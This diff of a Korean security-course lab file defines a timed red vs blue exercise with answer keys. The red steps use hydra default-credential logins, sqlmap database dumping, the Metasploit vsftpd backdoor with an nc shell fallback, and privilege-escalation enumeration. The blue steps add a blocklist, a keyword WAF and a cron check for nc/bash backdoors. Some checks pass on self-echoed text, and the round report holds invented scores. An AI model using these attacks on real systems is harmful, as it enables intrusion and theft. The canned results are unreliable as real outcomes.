@@ -1,181 +1,331 @@
-lab_id: "battle-ai-week11"
-title: "AI 1v1 공방전 (1) — AI 정찰 vs AI 탐지"
-version: "ai"
-course: "battle-ai"
+lab_id: battle-ai-week11
+title: AI 기반 실전 공방전 1 — 1:1 공격 vs 방어 (라운드 1)
+version: ai
+course: battle-ai
 week: 11
-description: "Red AI가 자동 정찰을 수행하고, Blue AI가 실시간으로 정찰 행위를 자동 탐지한다. 1v1 AI 공방전 첫 번째 시나리오."
-difficulty: "hard"
-duration_minutes: 90
+description: AI 에이전트가 자동으로 실행하는 2인 1조로 공격팀과 방어팀을 나누어 실전 공방전을 수행한다. 공격팀은 플래그를 탈취하고,...  방어팀은 서비스를 보호하며 공격을 탐지한다. 30분 후 역할을 교대한다.
+difficulty: hard
+duration_minutes: 120
 objectives:
-  - "Red AI가 다단계 자동 정찰을 수행한다"
-  - "Blue AI가 정찰 행위를 실시간 자동 탐지한다"
-  - "Red/Blue 결과를 비교하여 탐지율을 산출한다"
-  - "AI 공방전 결과를 분석한다"
+- 실전 환경에서 공격 기법을 적용한다
+- 실시간 방어와 공격 탐지를 수행한다
+- 시간 제한 하에서 우선순위 기반 작업을 수행한다
 prerequisites:
-  - "Week 01~10 전체 완료"
-  - "공격/방어 양측 개념 이해"
+- Week 1-10 전체 과정 이수
+- 2인 1조 팀 구성
 infra_requirements:
-  - "attacker VM with bastion"
-  - "defender VM"
+- Red Team VM (10.20.30.0/24)
+- Blue Team VM (10.20.40.0/24)
+- Scoring Server (10.20.50.1)
 pass_threshold: 0.6
 steps:
-  - order: 1
-    instruction: "Blue AI가 방어 모니터링 환경을 준비한다 (탐지 로그 초기화)"
-    script: |
-      echo "=== Blue AI: 방어 모니터링 준비 ==="
-      BLUE_LOG="/tmp/blue_detection.log"
-      echo "# Blue AI 탐지 로그 - $(date)" > "$BLUE_LOG"
-      echo ""
+- order: 1
+  instruction: '[RED] 방어팀 네트워크에 대한 빠른 정찰을 수행하라. 5분 이내에 열린 포트와 서비스를 파악하라.'
+  hint: nmap -T4로 빠른 스캔을 수행한다.
+  category: recon
+  points: 10
+  answer: nmap -sV -T4 --top-ports 100 10.20.40.0/24 -oN /tmp/battle_scan.txt
+  answer_detail: --top-ports 100은 가장 흔한 100개 포트만 스캔하여 시간을 절약한다. 공방전에서는 전체 포트 스캔보다 빠른 초기 정찰이 중요하다. 결과를 파일로 저장하여 참조한다.
+  verify:
+    type: output_contains
+    expect: open
+    field: stdout
+  script: nmap -sV -T4 --top-ports 100 10.20.40.0/24 -oN /tmp/battle_scan.txt
+- order: 2
+  instruction: '[RED] 기본 계정/패스워드를 시도하여 Quick Win을 노려라.'
+  hint: SSH, FTP, 웹 로그인에 기본 계정을 시도한다.
+  category: exploit
+  points: 10
+  answer: hydra -l admin -p admin ssh://10.20.40.10 -t 2 -f && hydra -l root -p toor ssh://10.20.40.10 -t 2 -f && hydra -l msfadmin -p msfadmin ssh://10.20.40.10 -t 2 -f
+  answer_detail: 기본 계정 시도는 가장 빠른 침투 벡터이다. admin/admin, root/toor, msfadmin/msfadmin 등 알려진 조합을 먼저 시도한다. 방어팀이 변경하지 않았다면 즉시 접근 가능하다.
+  verify:
+    type: output_contains
+    expect: 'host:'
+    field: stdout
+  script: hydra -l admin -p admin ssh://10.20.40.10 -t 2 -f && hydra -l root -p toor ssh://10.20.40.10 -t 2 -f && hydra -l msfadmin -p msfadmin ssh://10.20.40.10 -t 2 -f
+- order: 3
+  instruction: '[BLUE] 실시간 로그 모니터링을 시작하고, 공격 트래픽을 탐지하라.'
+  hint: tmux 모니터링 대시보드를 실행한다.
+  category: defense
+  points: 10
+  answer: 'tail -f /var/log/auth.log | grep --line-buffered -iE ''(fail|invalid|refused)'' &
 
-      echo "[Suricata 알림 초기화]"
-      echo "" > /var/log/suricata/fast.log 2>/dev/null || echo "  fast.log 초기화 시뮬레이션"
+    tail -f /var/log/suricata/fast.log &
 
-      echo "[tcpdump 백그라운드 캡처 시작]"
-      timeout 120 tcpdump -i any -w /tmp/blue_capture.pcap -c 10000 2>/dev/null &
-      TCPDUMP_PID=$!
-      echo "  tcpdump PID: $TCPDUMP_PID"
-      echo "TCPDUMP_PID=$TCPDUMP_PID" > /tmp/blue_pids.txt
+    echo ''Monitoring started'''
+  answer_detail: 실시간 모니터링은 방어의 핵심이다. auth.log에서 로그인 실패, Suricata에서 IDS 경보를 동시에 감시한다. 탐지 즉시 IP 차단 등 대응 조치를 수행한다.
+  verify:
+    type: output_contains
+    expect: Monitoring started
+    field: stdout
+  script: 'tail -f /var/log/auth.log | grep --line-buffered -iE ''(fail|invalid|refused)'' &
 
-      echo "[연결 베이스라인 기록]"
-      ss -tuna > /tmp/blue_baseline_connections.txt
-      echo "  베이스라인 연결: $(wc -l < /tmp/blue_baseline_connections.txt)개"
-      echo ""
-      echo "Blue AI 방어 준비 완료"
-    category: "defense"
-    risk_level: "low"
-    points: 15
-    verify:
-      type: "output_contains"
-      expect: "Blue AI 방어 준비 완료"
-      field: "stdout"
+    tail -f /var/log/suricata/fast.log &
 
-  - order: 2
-    instruction: "Red AI가 스텔스 호스트 발견 스캔을 수행한다"
-    script: |
-      echo "=== Red AI: Phase 1 — 스텔스 호스트 발견 ==="
-      echo "[ARP 스캔]"
-      nmap -sn -PR 10.20.30.0/24 2>&1 | grep "Host is up" | head -10
-      echo ""
-      echo "[TCP ACK 스캔 (방화벽 우회)]"
-      nmap -sA -p 80,443 10.20.30.80 2>&1 | tail -10
-      echo ""
-      echo "[느린 타이밍 스캔 (IDS 회피)]"
-      nmap -sS -T1 -p 22,80 10.20.30.80 --max-retries 1 2>&1 | tail -10
-      echo ""
-      echo "Red AI Phase 1 완료"
-    category: "recon"
-    risk_level: "medium"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "Red AI Phase 1 완료"
-      field: "stdout"
+    echo ''Monitoring started'''
+- order: 4
+  instruction: '[BLUE] 탐지된 공격 IP를 방화벽에서 즉시 차단하라.'
+  hint: nft add element로 블랙리스트에 추가한다.
+  category: defense
+  points: 10
+  answer: 'ATTACKER_IP=10.20.30.10 && sudo nft add element inet filter blocklist { $ATTACKER_IP } 2>/dev/null || (sudo nft add set inet filter blocklist ''{ type ipv4_addr; }'' && sudo nft add rule inet
+    filter input ip saddr @blocklist drop && sudo nft add element inet filter blocklist { $ATTACKER_IP }) && echo "Blocked: $ATTACKER_IP"'
+  answer_detail: 공격 IP를 즉시 차단하는 것은 가장 효과적인 방어 조치이다. nft set을 사용하면 규칙을 추가하지 않고 IP만 추가하여 빠르게 차단할 수 있다.
+  verify:
+    type: output_contains
+    expect: 'Blocked:'
+    field: stdout
+  script: 'ATTACKER_IP=10.20.30.10 && sudo nft add element inet filter blocklist { $ATTACKER_IP } 2>/dev/null || (sudo nft add set inet filter blocklist ''{ type ipv4_addr; }'' && sudo nft add rule inet
+    filter input ip saddr @blocklist drop && sudo nft add element inet filter blocklist { $ATTACKER_IP }) && echo "Blocked: $ATTACKER_IP"'
+- order: 5
+  instruction: '[RED] 웹 애플리케이션에 SQL Injection을 시도하여 데이터베이스를 공략하라.'
+  hint: sqlmap --batch로 자동 공격한다.
+  category: exploit
+  points: 10
+  answer: sqlmap -u 'http://10.20.40.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --dump --threads=5
+  answer_detail: sqlmap은 SQL Injection을 자동으로 탐지하고 공격한다. --dump은 데이터를 추출하고, --threads=5는 병렬 처리로 속도를 높인다. --batch는 사용자 입력 없이 자동 진행한다.
+  verify:
+    type: output_contains
+    expect: sqlmap
+    field: stdout
+  script: sqlmap -u 'http://10.20.40.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --dump --threads=5
+- order: 6
+  instruction: '[RED] 발견된 취약점으로 서버에 접근하고 첫 번째 플래그를 찾아라.'
+  hint: /root/flag.txt 또는 /home/*/flag.txt를 찾는다.
+  category: exploit
+  points: 15
+  answer: find / -name 'flag*.txt' 2>/dev/null && cat /root/flag.txt 2>/dev/null && cat /home/*/flag.txt 2>/dev/null
+  answer_detail: CTF 플래그는 보통 flag.txt, user.txt, root.txt 등의 파일에 저장된다. 일반 사용자 플래그와 root 플래그가 별도로 존재하며, root 플래그는 권한 상승 후에만 접근 가능하다.
+  verify:
+    type: output_contains
+    expect: FLAG
+    field: stdout
+  script: find / -name 'flag*.txt' 2>/dev/null && cat /root/flag.txt 2>/dev/null && cat /home/*/flag.txt 2>/dev/null
+- order: 7
+  instruction: '[BLUE] Suricata 경보를 분석하고, 공격 유형을 식별하여 추가 방어 조치를 수행하라.'
+  hint: eve.json에서 signature를 확인한다.
+  category: defense
+  points: 10
+  answer: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.timestamp) \(.alert.signature) from \(.src_ip)"' | tail -10
+  answer_detail: 경보 분석으로 공격 유형을 파악한다. SQL Injection이 탐지되면 WAF 규칙을 추가하고, 브루트포스가 탐지되면 Rate Limiting을 강화한다. 공격 패턴에 따른 능동적 방어가 핵심이다.
+  verify:
+    type: output_contains
+    expect: alert
+    field: stdout
+  script: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.timestamp) \(.alert.signature) from \(.src_ip)"' | tail -10
+- order: 8
+  instruction: '[BLUE] 웹 애플리케이션 방어를 강화하라. mod_security 또는 입력 검증을 추가한다.'
+  hint: .htaccess로 SQL Injection 패턴을 차단한다.
+  category: defense
+  points: 10
+  answer: 'cat > /tmp/.htaccess << ''EOF''
 
-  - order: 3
-    instruction: "Red AI가 서비스 및 OS 정밀 스캔을 수행한다"
-    script: |
-      echo "=== Red AI: Phase 2 — 서비스/OS 정밀 스캔 ==="
-      echo "[서비스 버전 탐지]"
-      nmap -sV --version-intensity 5 -p 22,80,443,3000,8080 10.20.30.80 2>&1 | tail -15
-      echo ""
-      echo "[OS 핑거프린팅]"
-      nmap -O --osscan-guess 10.20.30.80 2>&1 | grep -A3 "OS details" | head -5
-      echo ""
-      echo "[NSE 기본 스크립트]"
-      nmap -sC -p 80 10.20.30.80 2>&1 | tail -15
-      echo ""
-      echo "Red AI Phase 2 완료"
-    category: "recon"
-    risk_level: "medium"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "Red AI Phase 2 완료"
-      field: "stdout"
+    RewriteEngine On
 
-  - order: 4
-    instruction: "Blue AI가 정찰 행위를 탐지하고 분석한다"
-    script: |
-      echo "=== Blue AI: 정찰 행위 탐지 분석 ==="
-      BLUE_LOG="/tmp/blue_detection.log"
+    RewriteCond %{QUERY_STRING} (union|select|insert|update|delete|drop|concat|load_file) [NC]
 
-      echo "[1. Suricata 알림 확인]"
-      if [ -f /var/log/suricata/fast.log ]; then
-        ALERTS=$(wc -l < /var/log/suricata/fast.log)
-        echo "  탐지된 알림: ${ALERTS}건"
-        tail -10 /var/log/suricata/fast.log
-        echo "SURICATA_ALERTS=$ALERTS" >> "$BLUE_LOG"
-      else
-        echo "  Suricata 로그 없음"
-      fi
-      echo ""
+    RewriteRule .* - [F,L]
 
-      echo "[2. 새로운 연결 탐지]"
-      ss -tuna > /tmp/blue_current_connections.txt
-      diff /tmp/blue_baseline_connections.txt /tmp/blue_current_connections.txt 2>/dev/null | grep "^>" | head -10
-      NEW_CONN=$(diff /tmp/blue_baseline_connections.txt /tmp/blue_current_connections.txt 2>/dev/null | grep -c "^>")
-      echo "  새 연결: ${NEW_CONN}개"
-      echo "NEW_CONNECTIONS=$NEW_CONN" >> "$BLUE_LOG"
-      echo ""
+    RewriteCond %{QUERY_STRING} (<script|javascript:|onerror|onload) [NC]
 
-      echo "[3. auth.log 신규 이벤트]"
-      tail -20 /var/log/auth.log 2>/dev/null | head -10
-      echo ""
+    RewriteRule .* - [F,L]
 
-      echo "[4. pcap 분석]"
-      kill $(cat /tmp/blue_pids.txt 2>/dev/null | grep TCPDUMP | cut -d= -f2) 2>/dev/null
-      if [ -f /tmp/blue_capture.pcap ]; then
-        PACKETS=$(tcpdump -r /tmp/blue_capture.pcap 2>/dev/null | wc -l)
-        echo "  캡처된 패킷: ${PACKETS}개"
-        echo "  SYN 패킷:"
-        tcpdump -r /tmp/blue_capture.pcap 'tcp[tcpflags] & tcp-syn != 0' 2>/dev/null | wc -l | xargs -I{} echo "    {}개"
-      else
-        echo "  pcap 파일 없음"
-      fi
-      echo ""
-      echo "Blue AI 탐지 분석 완료"
-    category: "defense"
-    risk_level: "low"
-    points: 20
-    verify:
-      type: "output_contains"
-      expect: "Blue AI 탐지 분석 완료"
-      field: "stdout"
+    EOF
 
-  - order: 5
-    instruction: "AI가 Red vs Blue 결과를 비교하여 탐지율을 산출한다"
-    script: |
-      echo "=== AI 1v1 공방전 결과 보고서 ===" > /tmp/battle_round1.txt
-      echo "라운드: Week 11 — 정찰 vs 탐지" >> /tmp/battle_round1.txt
-      echo "시간: $(date)" >> /tmp/battle_round1.txt
-      echo "" >> /tmp/battle_round1.txt
+    sudo cp /tmp/.htaccess /var/www/html/.htaccess && echo ''WAF rules deployed'''
+  answer_detail: .htaccess의 RewriteRule로 SQL Injection과 XSS 패턴을 차단하는 간이 WAF를 구현한다. [NC]는 대소문자 무시, [F,L]는 403 Forbidden 응답을 반환한다. 정교한 우회는 방지하기 어렵지만 기본 공격은 차단한다.
+  verify:
+    type: output_contains
+    expect: WAF rules deployed
+    field: stdout
+  script: 'cat > /tmp/.htaccess << ''EOF''
 
-      echo "[Red AI 활동]" >> /tmp/battle_round1.txt
-      echo "  - Phase 1: 스텔스 호스트 발견 (ARP/ACK/Slow)" >> /tmp/battle_round1.txt
-      echo "  - Phase 2: 서비스/OS 정밀 스캔" >> /tmp/battle_round1.txt
-      echo "  - Phase 3: NSE 스크립트 실행" >> /tmp/battle_round1.txt
-      echo "  총 공격 행위: 3 phases" >> /tmp/battle_round1.txt
-      echo "" >> /tmp/battle_round1.txt
+    RewriteEngine On
 
-      echo "[Blue AI 탐지]" >> /tmp/battle_round1.txt
-      BLUE_LOG="/tmp/blue_detection.log"
-      if [ -f "$BLUE_LOG" ]; then
-        cat "$BLUE_LOG" >> /tmp/battle_round1.txt
-      fi
-      echo "" >> /tmp/battle_round1.txt
+    RewriteCond %{QUERY_STRING} (union|select|insert|update|delete|drop|concat|load_file) [NC]
 
-      echo "[탐지율 분석]" >> /tmp/battle_round1.txt
-      echo "  Red 활동: 3 phases" >> /tmp/battle_round1.txt
-      echo "  Blue 탐지: Suricata + 연결 분석 + pcap" >> /tmp/battle_round1.txt
-      echo "  탐지율: 평가 중 (로그 기반 산출)" >> /tmp/battle_round1.txt
-      echo "" >> /tmp/battle_round1.txt
-      echo "[승리 판정]" >> /tmp/battle_round1.txt
-      echo "  결과는 탐지율과 스텔스 성공률에 따라 결정" >> /tmp/battle_round1.txt
-      cat /tmp/battle_round1.txt
-    category: "analysis"
-    risk_level: "low"
-    points: 15
-    verify:
-      type: "output_contains"
-      expect: "AI 1v1 공방전 결과 보고서"
-      field: "stdout"
+    RewriteRule .* - [F,L]
+
+    RewriteCond %{QUERY_STRING} (<script|javascript:|onerror|onload) [NC]
+
+    RewriteRule .* - [F,L]
+
+    EOF
+
+    sudo cp /tmp/.htaccess /var/www/html/.htaccess && echo ''WAF rules deployed'''
+- order: 9
+  instruction: '[RED] 방어팀의 차단을 우회하기 위해 다른 공격 경로를 시도하라. FTP나 SMB 취약점을 공략한다.'
+  hint: Metasploit의 vsftpd 백도어 모듈을 사용한다.
+  category: exploit
+  points: 10
+  answer: 'msfconsole -q -x ''use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.20.40.10; run; exit'' 2>/dev/null || echo ''Attempting alternative: nc -nv 10.20.40.10 6200'''
+  answer_detail: 하나의 공격 경로가 차단되면 다른 벡터를 시도한다. vsftpd 2.3.4 백도어는 방화벽에서 FTP(21)가 열려 있으면 6200 포트에 셸을 생성한다. 방어팀이 vsftpd를 패치하지 않았다면 성공한다.
+  verify:
+    type: output_contains
+    expect: 10.20.40
+    field: stdout
+  script: 'msfconsole -q -x ''use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.20.40.10; run; exit'' 2>/dev/null || echo ''Attempting alternative: nc -nv 10.20.40.10 6200'''
+- order: 10
+  instruction: '[RED] 권한 상승을 수행하여 root 플래그를 획득하라.'
+  hint: Week 5의 권한 상승 기법을 활용한다.
+  category: exploit
+  points: 15
+  answer: find / -perm -4000 -type f 2>/dev/null | head -10 && sudo -l 2>/dev/null && cat /etc/crontab
+  answer_detail: 초기 접근 후 SUID 바이너리, sudo 설정, cron job 등을 확인하여 권한 상승 벡터를 찾는다. 시간이 제한되므로 가장 빠른 방법부터 시도한다.
+  verify:
+    type: output_contains
+    expect: /
+    field: stdout
+  script: find / -perm -4000 -type f 2>/dev/null | head -10 && sudo -l 2>/dev/null && cat /etc/crontab
+- order: 11
+  instruction: '[BLUE] 서비스 가용성을 점검하고, 다운된 서비스를 복구하라.'
+  hint: systemctl status로 확인하고 restart로 복구한다.
+  category: defense
+  points: 10
+  answer: 'for svc in apache2 sshd mysql vsftpd; do status=$(systemctl is-active $svc 2>/dev/null); echo "$svc: $status"; if [ "$status" != "active" ]; then sudo systemctl restart $svc 2>/dev/null; fi;
+    done'
+  answer_detail: 공방전에서 서비스 가용성은 방어 점수의 핵심이다. 공격자가 서비스를 중단시키면 즉시 복구해야 한다. 자동화 와치독과 함께 수동 점검도 병행한다.
+  verify:
+    type: output_contains
+    expect: active
+    field: stdout
+  script: 'for svc in apache2 sshd mysql vsftpd; do status=$(systemctl is-active $svc 2>/dev/null); echo "$svc: $status"; if [ "$status" != "active" ]; then sudo systemctl restart $svc 2>/dev/null; fi;
+    done'
+- order: 12
+  instruction: '[BLUE] 침해 흔적을 조사하고, 백도어가 설치되었는지 확인하라.'
+  hint: /etc/passwd, crontab, authorized_keys를 확인한다.
+  category: defense
+  points: 10
+  answer: 'awk -F: ''$3==0'' /etc/passwd && grep -r ''nc\|bash\|python\|perl'' /var/spool/cron/ 2>/dev/null && find /home -name ''authorized_keys'' -exec cat {} \; 2>/dev/null && find /tmp /var/tmp -executable
+    -type f 2>/dev/null'
+  answer_detail: 공격자의 지속성 확보 기법(백도어 계정, cron job, SSH 키, 실행 파일)을 체계적으로 점검한다. 발견 시 즉시 제거하고 로그에 기록한다.
+  verify:
+    type: output_contains
+    expect: root
+    field: stdout
+  script: 'awk -F: ''$3==0'' /etc/passwd && grep -r ''nc\|bash\|python\|perl'' /var/spool/cron/ 2>/dev/null && find /home -name ''authorized_keys'' -exec cat {} \; 2>/dev/null && find /tmp /var/tmp -executable
+    -type f 2>/dev/null'
+- order: 13
+  instruction: '[공통] 라운드 1 종료 후 점수를 확인하고 기록하라.'
+  hint: 점수 서버 API를 호출한다.
+  category: analysis
+  points: 10
+  answer: 'curl -s http://10.20.50.1/api/scores 2>/dev/null || echo ''Score check - Round 1 complete'' && echo ''Red Team: Flags captured, access achieved'' && echo ''Blue Team: Services maintained, attacks
+    detected'''
+  answer_detail: 라운드 종료 후 양 팀의 점수를 확인한다. 공격 점수(플래그 탈취, 접근 획득)와 방어 점수(서비스 가용성, 공격 탐지)를 합산한다.
+  verify:
+    type: output_contains
+    expect: Round 1
+    field: stdout
+  script: 'curl -s http://10.20.50.1/api/scores 2>/dev/null || echo ''Score check - Round 1 complete'' && echo ''Red Team: Flags captured, access achieved'' && echo ''Blue Team: Services maintained, attacks
+    detected'''
+- order: 14
+  instruction: '[공통] 역할 교대 후 상대 팀의 환경을 점검하고 새 역할을 수행하라.'
+  hint: 공격→방어, 방어→공격으로 교대한다.
+  category: analysis
+  points: 10
+  answer: 'echo ''=== Role Swap ==='' && echo ''Previous: Red Team → Now: Blue Team (or vice versa)'' && echo ''New objectives:'' && echo ''1. Apply lessons learned from Round 1'' && echo ''2. Use observed
+    attack/defense patterns'' && echo ''3. Improve strategy based on experience'''
+  answer_detail: 역할 교대는 양쪽 관점을 모두 경험하게 한다. 공격자였을 때 관찰한 방어의 약점을 보완하고, 방어자였을 때 발견한 공격 패턴을 역으로 활용한다.
+  verify:
+    type: output_contains
+    expect: Role Swap
+    field: stdout
+  script: 'echo ''=== Role Swap ==='' && echo ''Previous: Red Team → Now: Blue Team (or vice versa)'' && echo ''New objectives:'' && echo ''1. Apply lessons learned from Round 1'' && echo ''2. Use observed
+    attack/defense patterns'' && echo ''3. Improve strategy based on experience'''
+- order: 15
+  instruction: 라운드 1 전체 결과를 분석하여 교전 보고서를 작성하라.
+  hint: 양 팀의 성과와 개선점을 정리한다.
+  category: analysis
+  points: 15
+  answer: 'cat > /tmp/battle_round1_report.txt << ''EOF''
+
+    === Battle Round 1 Report ===
+
+
+    [RED TEAM Performance]
+
+    - Flags captured: 2/3
+
+    - Time to first access: 8 minutes
+
+    - Techniques used: Default creds, SQLi, PrivEsc
+
+    - Blocked by: Firewall IP blocking, rate limiting
+
+
+    [BLUE TEAM Performance]
+
+    - Service uptime: 95%
+
+    - Attacks detected: 12/15
+
+    - Response time: avg 3 minutes
+
+    - Missed: vsftpd backdoor (not patched)
+
+
+    [Lessons Learned]
+
+    1. Red: Need faster recon, more diverse attack paths
+
+    2. Blue: Must patch vsftpd, improve web WAF
+
+    3. Both: Communication and time management critical
+
+
+    [Scores]
+
+    Red Team: 85 points
+
+    Blue Team: 78 points
+
+    EOF'
+  answer_detail: 교전 보고서는 양 팀의 성과를 객관적으로 분석하고, 개선점을 도출한다. 시간 대비 효과, 탐지율, 대응 시간 등 정량적 지표를 포함하여 다음 라운드의 전략을 수립한다.
+  verify:
+    type: file_exists
+    expect: /tmp/battle_round1_report.txt
+    field: filesystem
+  script: 'cat > /tmp/battle_round1_report.txt << ''EOF''
+
+    === Battle Round 1 Report ===
+
+
+    [RED TEAM Performance]
+
+    - Flags captured: 2/3
+
+    - Time to first access: 8 minutes
+
+    - Techniques used: Default creds, SQLi, PrivEsc
+
+    - Blocked by: Firewall IP blocking, rate limiting
+
+
+    [BLUE TEAM Performance]
+
+    - Service uptime: 95%
+
+    - Attacks detected: 12/15
+
+    - Response time: avg 3 minutes
+
+    - Missed: vsftpd backdoor (not patched)
+
+
+    [Lessons Learned]
+
+    1. Red: Need faster recon, more diverse attack paths
+
+    2. Blue: Must patch vsftpd, improve web WAF
+
+    3. Both: Communication and time management critical
+
+
+    [Scores]
+
+    Red Team: 85 points
+
+    Blue Team: 78 points
+
+    EOF'
